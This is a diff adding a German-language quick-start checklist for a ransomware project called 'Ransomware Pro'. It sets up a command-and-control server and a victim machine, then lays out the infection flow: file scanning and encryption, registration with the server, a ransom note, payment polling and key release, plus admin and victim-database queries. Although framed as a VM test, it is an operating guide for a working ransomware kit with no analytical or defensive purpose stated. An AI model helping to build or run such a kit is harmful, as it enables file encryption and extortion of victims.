@@ -1,0 +1,134 @@
+# RANSOMWARE PRO - QUICK START CHECKLIST
+
+## ✅ HOST PC (dieser PC - 192.168.126.200)
+
+```bash
+[ ] 1. cd D:\ransomware_pro
+[ ] 2. pip install -r requirements.txt
+[ ] 3. python setup_test.py server
+      ↓
+      Server läuft auf http://0.0.0.0:5000
+      Wartet auf Victim-Verbindungen...
+```
+
+---
+
+## ✅ VICTIM VM
+
+```bash
+[ ] 1. cd D:\ransomware_pro
+[ ] 2. pip install -r requirements.txt
+[ ] 3. python setup_test.py victim --server-ip 192.168.126.200
+      ↓
+      Victim verbindet zu C2 Server
+      Startet Encryption & Payment-Monitoring
+```
+
+---
+
+## 🔄 TESTING WORKFLOW
+
+**Terminal 1 (HOST):**
+```bash
+python setup_test.py server
+# Wartet auf Connections
+```
+
+**Terminal 2 (VICTIM VM):**
+```bash
+python setup_test.py victim --server-ip 192.168.126.200
+# Startet Infektion
+```
+
+**Terminal 3 (HOST - Monitoring):**
+```bash
+# Prüfe Registrierung
+curl http://localhost:5000/api/v1/payment/status/VICTIM_ID
+
+# Prüfe Statistics
+curl http://localhost:5000/api/v1/admin/stats
+
+# Markiere Payment (für Test)
+python mark_payment.py VICTIM_ID
+```
+
+---
+
+## 🔑 WICHTIGE BEFEHLE
+
+**Stats anschauen:**
+```bash
+curl http://localhost:5000/api/v1/admin/stats
+```
+
+**Database anschauen:**
+```bash
+python -c "import sqlite3; c=sqlite3.connect('C:\\ransomware\\victims.db'); print(c.cursor().execute('SELECT COUNT(*) FROM victims').fetchone())"
+```
+
+**Cleanup:**
+```bash
+python cleanup.py
+rmdir /s C:\ransomware
+```
+
+---
+
+## 🎯 ERWARTETER FLOW
+
+```
+VICTIM                          SERVER
+────────────────────────────────────────
+Startet
+Scannt Dateien              
+Verschlüsselt Dateien
+                    ──POST /register──→
+                    ←──Response OK─────
+Zeigt Ransom Note
+Startet Payment-Check
+(alle 30 Sekunden)
+                    ──GET /payment/status──→
+                    ←──NOT PAID───────────
+[Wartet...]
+                    
+(HOST: Payment markiert)
+                    ──GET /payment/status──→
+                    ←──PAID!──────────────
+Fordert Key an
+                    ──GET /decryption/key──→
+                    ←──Key + Status:PAID──
+Entschlüsselt Dateien
+[FERTIG!]
+```
+
+---
+
+## ⚠️ TROUBLESHOOTING
+
+**"Connection refused" auf Victim:**
+- [ ] Server wirklich gestartet? (HOST)
+- [ ] IP richtig? (sollte 192.168.126.200 sein)
+- [ ] Port 5000 offen? (Firewall prüfen)
+
+**"No module named..." Fehler:**
+- [ ] pip install -r requirements.txt ausgeführt?
+- [ ] Beide auf pip install?
+
+**Dateien werden nicht verschlüsselt:**
+- [ ] Test-Dateien in den Target-Directories?
+- [ ] DEBUG_MODE=true gesetzt?
+
+**Payment wird nicht erkannt:**
+- [ ] Database OK? (Prüfe Query oben)
+- [ ] Status ist 'INFECTED'? (nicht 'PAID')
+- [ ] Victim checked noch? (Payment-Thread läuft?)
+
+---
+
+**Ready?** 
+1. Speichern Sie diese Datei
+2. Terminal 1: `python setup_test.py server`
+3. Terminal 2 (VM): `python setup_test.py victim --server-ip 192.168.126.200`
+4. Beobachten Sie die Logs!
+
+🚀 **GO!**
